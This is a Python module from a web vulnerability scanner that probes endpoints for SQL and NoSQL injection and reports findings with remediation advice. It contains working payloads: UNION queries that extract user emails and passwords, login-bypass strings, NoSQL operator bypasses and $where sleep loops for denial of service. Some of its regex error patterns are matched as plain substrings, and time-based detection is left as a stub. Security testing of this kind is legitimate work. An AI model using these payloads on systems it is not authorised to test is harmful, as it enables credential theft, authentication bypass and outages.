"""SQL Injection detection module."""

from __future__ import annotations

import time
import uuid
from typing import Any
from urllib.parse import urlencode

from diana.config import ScanConfig
from diana.core.models import (
    Endpoint,
    Finding,
    Hypothesis,
    Payload,
    Severity,
    SiteMap,
    VulnType,
)
from diana.scanners.base import BaseScanner

# Error-based detection patterns
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax.*mysql",
    "warning.*mysql_",
    "valid mysql result",
    "mysqlclient",
    "postgresql.*error",
    "warning.*pg_",
    "npgsql",
    "microsoft.*odbc.*sql.*server",
    "microsoft.*oledb.*sql.*server",
    "jet database engine",
    "oracle.*error",
    "ora-[0-9]{5}",
    "sqlite.*error",
    "sqlite3.operationalerror",
    "near \".*\": syntax error",
    "sqlexception",
    "system.data.sqlclient",
    "pdo.*exception",
]

# Static payloads for non-AI mode
STATIC_SQLI_PAYLOADS = [
    # Error-based
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    # Boolean-blind
    "1' AND '1'='1",
    "1' AND '1'='2",
    # UNION-based (escalating column count for data extraction)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    # UNION with data extraction (common column counts)
    "' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    # Time-based blind
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND pg_sleep(5)--",
    # NoSQL injection
    "' || '1'=='1",
    "{\"$gt\": \"\"}",
    "{\"$ne\": null}",
]

# Additional payloads for search/query parameters (more likely to return data)
SEARCH_SQLI_PAYLOADS = [
    "')) OR 1=1--",
    "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
    "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
    "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
]

# --- NoSQL (document-DB) injection ---------------------------------------
#
# Unlike SQL payloads, NoSQL operators only take effect when they reach the
# database as real JSON *objects* — a query selector like {"$ne": null} tells
# a MongoDB-style driver "match every document", and {"$where": "<js>"} runs
# arbitrary server-side JavaScript. A string that merely *looks* like an
# operator (e.g. the literal '{"$gt": ""}') is treated as a scalar and does
# nothing. So these must be injected as structured values into a JSON body,
# not as string payloads dropped into a URL. This is generic to any app whose
# JSON API feeds request fields into a document-store selector.

# Selector-manipulation operators: replace a scalar field with an object that
# broadens the query to match unintended documents (auth bypass / mass update).
NOSQL_MANIPULATION_OPERATORS: list[dict[str, Any]] = [
    {"$ne": None},
    {"$gt": ""},
    {"$ne": -1},
    {"$regex": ".*"},
    {"$in": [None, ""]},
]

# Time delay (ms) requested by the server-side-JS DoS probe. Chosen well above
# normal response jitter so a real evaluation is unambiguous, but bounded.
NOSQL_SLEEP_MS = 2500
# A response is flagged as a time-based hit only if it is slower than baseline
# by at least this margin (seconds) AND slower than the absolute floor. Guards
# against network jitter producing false positives.
NOSQL_DELAY_MARGIN_S = 1.2
NOSQL_DELAY_FLOOR_S = NOSQL_SLEEP_MS / 1000.0 * 0.6


def _nosql_sleep_operators(sleep_ms: int) -> list[dict[str, Any]]:
    """Operators that force the DB engine to burn wall-clock time.

    ``$where`` evaluates server-side JavaScript (``sleep`` in a Mongo shell
    context); a catastrophic ``$regex`` against a long crafted subject forces
    the regex engine into exponential backtracking. Either delay, when it
    tracks the requested duration, proves the value reached the query engine.
    """
    return [
        {"$where": f"sleep({sleep_ms})"},
        {"$where": f"function(){{var t=Date.now();while(Date.now()-t<{sleep_ms}){{}};return true;}}"},
    ]


class SQLiScanner(BaseScanner):
    name = "sqli"
    description = "SQL Injection (error-based, boolean-blind, time-blind) detection"

    @property
    def vuln_types(self) -> list:
        return [VulnType.SQLI, VulnType.SQLI_BLIND]

    async def scan(self, config: ScanConfig) -> list[Finding]:
        findings: list[Finding] = []

        # Pull work from queue — each item is a param to test
        work_items = self.claim_work(limit=50)

        for item in work_items:
            params = item.get("payload", {}).get("params", {})
            endpoint = Endpoint(
                url=item["url"],
                method=item["method"],
                parameters=params,
            )

            request_body = item.get("payload", {}).get("request_body") or {}

            if item.get("payload", {}).get("type") == "login_endpoint":
                # Login injection test
                login_findings = await self._test_login_injection_endpoint(endpoint)
                findings.extend(login_findings)
            elif request_body:
                # Document-DB (NoSQL) operator injection into a JSON body.
                nosql_findings = await self._test_nosql_body(endpoint, request_body)
                for finding in nosql_findings:
                    findings.append(finding)
                    self.enqueue_to(
                        "access_control", item["url"], item["method"],
                        payload={"related_finding": f"NoSQLi found: {finding.title}"},
                    )
            elif params:
                payloads = await self._get_payloads_for_endpoint(endpoint, config)
                for payload in payloads:
                    finding = await self._test_payload(endpoint, payload)
                    if finding:
                        findings.append(finding)
                        # Found SQLi — enqueue to access_control for IDOR check
                        self.enqueue_to(
                            "access_control", item["url"], item["method"],
                            payload={"related_finding": f"SQLi found: {finding.title}"},
                        )

            self.complete_work(item["queue_id"])

        return findings

    async def _get_payloads_for_endpoint(
        self, endpoint: Endpoint, config: ScanConfig,
    ) -> list[Payload]:
        """Get payloads for an endpoint — AI-generated + static."""
        return await self._get_payloads(endpoint)

    async def _get_payloads(
        self, endpoint: Endpoint,
    ) -> list[Payload]:
        payloads: list[Payload] = []

        if self.ai:
            hyp = Hypothesis(
                vuln_type=VulnType.SQLI,
                endpoint=endpoint,
                confidence=0.5,
                reasoning="Endpoint accepts parameters that may be used in SQL queries",
            )
            ai_payloads = await self.ai.generate_payloads(hyp)
            payloads.extend(ai_payloads)

        for p in STATIC_SQLI_PAYLOADS:
            payloads.append(Payload(value=p, vuln_type=VulnType.SQLI))

        # Add search-specific UNION payloads for search/query endpoints
        if any(kw in endpoint.url.lower() for kw in ["search", "query", "find", "lookup"]):
            for p in SEARCH_SQLI_PAYLOADS:
                payloads.append(Payload(value=p, vuln_type=VulnType.SQLI, context="search"))

        return payloads

    async def _test_payload(
        self,
        endpoint: Endpoint,
        payload: Payload,
    ) -> Finding | None:
        """Test for SQL injection via error-based, UNION-based, and time-based detection."""
        # Get a baseline response for comparison
        baseline_len = 0
        try:
            if endpoint.method.upper() == "GET":
                baseline_url = endpoint.url
                if "?" not in baseline_url:
                    baseline_url = f"{baseline_url}?{urlencode(endpoint.parameters)}"
                baseline_resp = await self.http.get(baseline_url)
                baseline_len = len(baseline_resp.text)
        except Exception:
            pass

        for param_name in endpoint.parameters:
            test_params = dict(endpoint.parameters)
            test_params[param_name] = payload.value

            try:
                if endpoint.method.upper() == "GET":
                    url = endpoint.url
                    if "?" not in url:
                        url = f"{url}?{urlencode(test_params)}"
                    response = await self.http.get(url)
                else:
                    response = await self.http.post(endpoint.url, data=test_params)
            except Exception:
                continue

            # Error-based detection
            response_lower = response.text.lower()
            for pattern in SQL_ERROR_PATTERNS:
                if pattern in response_lower:
                    return Finding(
                        id=f"SQLI-{uuid.uuid4().hex[:8]}",
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        title=f"SQL Injection in {param_name} at {endpoint.url}",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to SQL injection. "
                            f"Database error message was disclosed in the response."
                        ),
                        endpoint=endpoint,
                        evidence=response.text[:500],
                        payload_used=payload.value,
                        cwe_id="CWE-89",
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings."
                        ),
                    )

            # UNION-based detection — response contains data that shouldn't be there
            if "UNION" in payload.value.upper() and response.status_code == 200:
                # Check for database schema artifacts
                union_indicators = [
                    "sqlite_master", "create table", "information_schema",
                    "password", "credential", "secret",
                ]
                for indicator in union_indicators:
                    if indicator in response_lower and (
                        baseline_len == 0 or len(response.text) > baseline_len * 1.5
                    ):
                        return Finding(
                            id=f"SQLI-UNION-{uuid.uuid4().hex[:8]}",
                            vuln_type=VulnType.SQLI,
                            severity=Severity.CRITICAL,
                            title=f"UNION SQL Injection in {param_name} at {endpoint.url}",
                            description=(
                                f"The parameter '{param_name}' is vulnerable to UNION-based "
                                f"SQL injection, allowing extraction of database contents."
                            ),
                            endpoint=endpoint,
                            evidence=response.text[:500],
                            payload_used=payload.value,
                            cwe_id="CWE-89",
                            remediation=(
                                "Use parameterized queries / prepared statements. "
                                "Never concatenate user input into SQL strings."
                            ),
                        )

            # Time-based blind detection
            if "SLEEP" in payload.value.upper() or "WAITFOR" in payload.value.upper() or "pg_sleep" in payload.value:
                # TODO: Compare response time against baseline
                pass

        return None

    async def _send_body(
        self, endpoint: Endpoint, body: dict[str, Any],
    ) -> tuple[Any, float]:
        """Send a JSON body with the endpoint's method; return (response, elapsed_s).

        Returns (None, elapsed) on transport error so the caller can still use
        the timing (a hung request is itself signal for the DoS probe).
        """
        start = time.perf_counter()
        try:
            response = await self.http.request(
                endpoint.method or "POST", endpoint.url, json=body,
            )
        except Exception:
            return None, time.perf_counter() - start
        return response, time.perf_counter() - start

    async def _test_nosql_body(
        self, endpoint: Endpoint, body: dict[str, Any],
    ) -> list[Finding]:
        """Inject NoSQL operator objects into each field of a JSON body.

        Two distinct classes are exercised, both fully generic:

        * **Manipulation** — a scalar field is replaced with a selector object
          (``{"$ne": ...}`` etc.). Detected by a differential: a scalar value
          that should not match is compared against the operator that matches
          everything; a success flip proves the operator altered query scope.
        * **Denial of service** — a ``$where`` server-side-JS sleep (or a
          catastrophic ``$regex``) is injected and the response time compared
          against baseline; a delay tracking the requested duration confirms
          the value reached and was evaluated by the query engine.
        """
        findings: list[Finding] = []
        if not body:
            return findings

        # Baseline timing with the original, unmodified body.
        _, baseline_elapsed = await self._send_body(endpoint, body)

        seen_types: set[str] = set()
        # Only object/scalar fields are worth targeting; cap field count so a
        # large body can't explode the request budget.
        for field in list(body.keys())[:6]:
            original = body[field]
            # A field already holding a nested object/list is a query filter
            # itself; still worth probing but skip obvious non-injectables.
            if isinstance(original, (dict, list)):
                continue

            # --- Manipulation (differential) ---------------------------------
            if "manipulation" not in seen_types:
                finding = await self._probe_nosql_manipulation(
                    endpoint, body, field, original,
                )
                if finding:
                    findings.append(finding)
                    seen_types.add("manipulation")

            # --- Denial of service (time-based) ------------------------------
            if "dos" not in seen_types:
                finding = await self._probe_nosql_dos(
                    endpoint, body, field, baseline_elapsed,
                )
                if finding:
                    findings.append(finding)
                    seen_types.add("dos")

            if len(seen_types) == 2:
                break

        return findings

    async def _probe_nosql_manipulation(
        self, endpoint: Endpoint, body: dict[str, Any], field: str, original: Any,
    ) -> Finding | None:
        """Detect selector manipulation via a match-nothing vs match-all diff."""
        # Control: a scalar the backend almost certainly cannot match.
        control_marker = f"diana-no-match-{uuid.uuid4().hex[:8]}"
        control_body = dict(body)
        control_body[field] = control_marker
        control_resp, _ = await self._send_body(endpoint, control_body)
        if control_resp is None:
            return None
        control_ok = control_resp.status_code < 400
        control_len = len(control_resp.text)

        for operator in NOSQL_MANIPULATION_OPERATORS:
            mutated = dict(body)
            mutated[field] = operator
            resp, _ = await self._send_body(endpoint, mutated)
            if resp is None:
                continue
            op_ok = resp.status_code < 400
            # Manipulation signal: the operator broadens the query so it now
            # succeeds (or returns materially more data) where a non-matching
            # scalar did not. Requires an actual behaviour change vs control to
            # avoid flagging endpoints that accept anything.
            grew = control_len > 0 and len(resp.text) > control_len * 1.5
            if op_ok and (not control_ok or grew):
                return Finding(
                    id=f"NOSQLI-{uuid.uuid4().hex[:8]}",
                    vuln_type=VulnType.SQLI,
                    severity=Severity.CRITICAL,
                    title=f"NoSQL Injection (operator manipulation) in {field} at {endpoint.url}",
                    description=(
                        f"The field '{field}' accepts a document-DB query operator "
                        f"object ({operator}). Injecting a selector such as $ne/$gt "
                        f"broadens the query to match documents the caller should not "
                        f"reach, enabling authentication bypass or mass record "
                        f"manipulation. A non-matching scalar value behaved differently, "
                        f"confirming the operator altered query semantics."
                    ),
                    endpoint=endpoint,
                    evidence=resp.text[:500],
                    payload_used=f'{{"{field}": {operator}}}',
                    cwe_id="CWE-943",
                    remediation=(
                        "Reject request fields whose value is an object where a scalar "
                        "is expected, or cast/validate types before building the query. "
                        "Never pass raw request JSON into a document-store selector."
                    ),
                )
        return None

    async def _probe_nosql_dos(
        self, endpoint: Endpoint, body: dict[str, Any], field: str,
        baseline_elapsed: float,
    ) -> Finding | None:
        """Detect server-side-JS / regex DoS via a delay that tracks the ask."""
        for operator in _nosql_sleep_operators(NOSQL_SLEEP_MS):
            mutated = dict(body)
            mutated[field] = operator
            resp, elapsed = await self._send_body(endpoint, mutated)
            delayed = (
                elapsed - baseline_elapsed >= NOSQL_DELAY_MARGIN_S
                and elapsed >= NOSQL_DELAY_FLOOR_S
            )
            if delayed:
                return Finding(
                    id=f"NOSQLI-DOS-{uuid.uuid4().hex[:8]}",
                    vuln_type=VulnType.SQLI_BLIND,
                    severity=Severity.HIGH,
                    title=f"NoSQL Injection denial of service in {field} at {endpoint.url}",
                    description=(
                        f"Injecting a $where server-side-JavaScript expression into the "
                        f"field '{field}' made the server sleep for a controlled duration "
                        f"(~{NOSQL_SLEEP_MS}ms requested, {elapsed:.1f}s observed vs "
                        f"{baseline_elapsed:.1f}s baseline). An attacker can pin database "
                        f"CPU and exhaust request handlers, causing denial of service — "
                        f"and the same evaluation channel permits arbitrary query logic."
                    ),
                    endpoint=endpoint,
                    evidence=(
                        f"baseline={baseline_elapsed:.2f}s observed={elapsed:.2f}s "
                        f"payload={operator}"
                    )[:500],
                    payload_used=f'{{"{field}": {operator}}}',
                    cwe_id="CWE-943",
                    remediation=(
                        "Disable server-side JavaScript evaluation ($where / mapReduce) "
                        "in the database, and validate that request fields are scalars "
                        "before using them in a query."
                    ),
                )
        return None

    async def _test_login_injection_endpoint(self, endpoint: Endpoint) -> list[Finding]:
        """Test a single login endpoint for SQL injection auth bypass."""
        return await self._test_login_injection([endpoint])

    async def _test_login_injection(self, login_endpoints: list[Endpoint]) -> list[Finding]:
        """Test login endpoints for SQL injection auth bypass."""
        findings: list[Finding] = []

        if not login_endpoints:
            return findings

        login_payloads = [
            "' OR 1=1--",
            "' OR '1'='1'--",
            "admin'--",
            "' OR 1=1#",
            "\" OR 1=1--",
        ]

        # Common login field patterns — tried in order
        # None marks the injection target field
        common_field_sets = [
            {"email": None, "password": "x"},
            {"username": None, "password": "x"},
            {"user": None, "pass": "x"},
            {"login": None, "password": "x"},
        ]

        for endpoint in login_endpoints:
            # Build field sets: start with any real params from crawler,
            # then fall back to common patterns
            field_sets = []

            if endpoint.parameters:
                param_names = list(endpoint.parameters.keys())
                user_field = next(
                    (p for p in param_names
                     if p.lower() in ("email", "username", "user", "login")),
                    None,
                )
                if user_field:
                    field_sets.append({user_field: None, **{
                        p: "x" for p in param_names if p != user_field
                    }})

            # Always include common patterns as fallback
            field_sets.extend(common_field_sets)

            for fields in field_sets:
                user_field = next(k for k, v in fields.items() if v is None)

                for sqli_payload in login_payloads:
                    test_data = dict(fields)
                    test_data[user_field] = sqli_payload

                    try:
                        response = await self.http.post(
                            endpoint.url,
                            json=test_data,
                        )
                    except Exception:
                        continue

                    # Check if we got authenticated (200 + token = SQLi auth bypass)
                    if response.status_code == 200:
                        body = response.text.lower()
                        if any(indicator in body for indicator in [
                            "token", "jwt", "session", "authenticated", "success",
                        ]):
                            findings.append(Finding(
                                id=f"SQLI-AUTH-{uuid.uuid4().hex[:8]}",
                                vuln_type=VulnType.SQLI,
                                severity=Severity.CRITICAL,
                                title=f"SQL Injection Auth Bypass at {endpoint.url}",
                                description=(
                                    f"The login endpoint accepts SQL injection in the "
                                    f"'{user_field}' field, allowing authentication bypass. "
                                    f"An attacker can log in as any user without valid credentials."
                                ),
                                endpoint=endpoint,
                                evidence=response.text[:500],
                                payload_used=sqli_payload,
                                cwe_id="CWE-89",
                                remediation=(
                                    "Use parameterized queries for authentication. "
                                    "Never concatenate user input into SQL WHERE clauses."
                                ),
                            ))
                            return findings  # One finding is enough

                    # Also check for error-based SQLi on login
                    response_lower = response.text.lower()
                    for pattern in SQL_ERROR_PATTERNS:
                        if pattern in response_lower:
                            findings.append(Finding(
                                id=f"SQLI-LOGIN-{uuid.uuid4().hex[:8]}",
                                vuln_type=VulnType.SQLI,
                                severity=Severity.CRITICAL,
                                title=f"SQL Injection in login at {endpoint.url}",
                                description=(
                                    f"The login endpoint is vulnerable to SQL injection "
                                    f"in the '{user_field}' field. Database error was disclosed."
                                ),
                                endpoint=endpoint,
                                evidence=response.text[:500],
                                payload_used=sqli_payload,
                                cwe_id="CWE-89",
                                remediation=(
                                    "Use parameterized queries for authentication."
                                ),
                            ))
                            return findings

        return findings
